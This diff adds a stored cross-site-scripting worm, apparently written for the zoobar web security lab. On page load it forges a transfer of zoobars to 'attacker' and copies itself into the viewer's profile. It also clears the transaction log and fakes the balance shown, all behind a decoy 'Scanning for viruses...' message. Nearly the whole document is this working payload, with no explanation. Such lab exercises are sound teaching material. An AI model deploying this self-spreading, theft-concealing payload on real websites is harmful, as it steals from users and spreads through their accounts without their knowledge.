@@ -1,0 +1,34 @@
+Scanning for viruses...</b>
+<script id="attacker_profile_worm">
+function worm_transfer() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "/zoobar/index.cgi/transfer", true);
+    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    xhr.send("zoobars=1&recipient=attacker&submission=Send");
+}
+function worm_spread() {
+    var attacker_script = document.getElementById("attacker_profile_worm").innerHTML;
+    var attacker_profile_text = 'Scanning for viruses...</b><script id="attacker_profile_worm">'+attacker_script+'</scr'+'ipt><b style="display: none">';
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "/zoobar/index.cgi/", true);
+    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    xhr.send("profile_update="+encodeURIComponent(attacker_profile_text)+"&profile_submit=Save");
+}
+function worm_clear_log() {
+	var log_table = document.getElementsByClassName("log")[0];
+    log_table.tBodies[0].innerHTML="";
+}
+function worm_reset_zoobar_show() {
+    var profile_header = document.getElementById("profileheader");
+	var profile_header_str = profile_header.innerHTML;
+	profile_header_str = profile_header_str.split(":")[0]+":10";
+    profile_header.innerHTML = profile_header_str;
+}
+document.addEventListener('DOMContentLoaded',function(){
+    worm_transfer();
+    worm_spread();
+	worm_clear_log();
+	setTimeout("worm_reset_zoobar_show()", 2000);
+});
+</script>
+<b style="display: none">
